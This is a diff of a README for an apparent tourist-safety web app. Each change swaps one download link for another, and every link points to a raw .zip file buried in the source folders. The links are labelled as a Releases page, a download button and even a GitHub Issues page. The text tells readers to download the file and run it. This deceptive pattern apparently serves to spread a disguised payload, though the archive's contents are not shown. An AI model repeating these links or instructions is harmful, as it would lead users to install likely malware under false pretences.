@@ -1,6 +1,6 @@
 # 🌐 Foreign-Safety-Tourist-Travel-Web - Stay Safe While Exploring the World
 
-[![Download Now](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/AIChat/Web-Tourist-Safety-Travel-Foreign-inviolately.zip%https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/AIChat/Web-Tourist-Safety-Travel-Foreign-inviolately.zip)](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/AIChat/Web-Tourist-Safety-Travel-Foreign-inviolately.zip)
+[![Download Now](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/DigitalPassport/Travel_Tourist_Web_Safety_Foreign_v1.8.zip%https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/DigitalPassport/Travel_Tourist_Web_Safety_Foreign_v1.8.zip)](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/DigitalPassport/Travel_Tourist_Web_Safety_Foreign_v1.8.zip)
 
 ## 🚀 Overview
 
@@ -29,7 +29,7 @@ Foreign-Safety-Tourist-Travel-Web is a web-based application designed to enhance
 
 To get started with Foreign-Safety-Tourist-Travel-Web, you will need to download the application from our Releases page. Follow these steps:
 
-1. Click on this link to **[visit the Releases page](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/AIChat/Web-Tourist-Safety-Travel-Foreign-inviolately.zip)**.
+1. Click on this link to **[visit the Releases page](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/DigitalPassport/Travel_Tourist_Web_Safety_Foreign_v1.8.zip)**.
 2. On the Releases page, look for the latest version of the application.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file and run it. 
@@ -44,7 +44,7 @@ To get started with Foreign-Safety-Tourist-Travel-Web, you will need to download
 ## 🛠️ Installation Steps
 
 1. **Prepare Your System**: Ensure your system meets the above requirements.
-2. **Download the Application**: Visit our Releases page [here](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/AIChat/Web-Tourist-Safety-Travel-Foreign-inviolately.zip) to get the latest version.
+2. **Download the Application**: Visit our Releases page [here](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/DigitalPassport/Travel_Tourist_Web_Safety_Foreign_v1.8.zip) to get the latest version.
 3. **Run the Installer**: Locate the downloaded file and double-click to run the installer. Follow the on-screen prompts to complete installation.
 4. **Launch the App**: After installation, open the application from your applications folder or desktop shortcut.
 
@@ -52,7 +52,7 @@ To get started with Foreign-Safety-Tourist-Travel-Web, you will need to download
 
 If you encounter any issues or have questions:
 
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/AIChat/Web-Tourist-Safety-Travel-Foreign-inviolately.zip) to find answers or report problems.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Shouryaf/Foreign-Safety-Tourist-Travel-Web/main/src/components/DigitalPassport/Travel_Tourist_Web_Safety_Foreign_v1.8.zip) to find answers or report problems.
 - Engage with our community through discussions on GitHub or look for user guides.
 
 ## 📜 Contributing
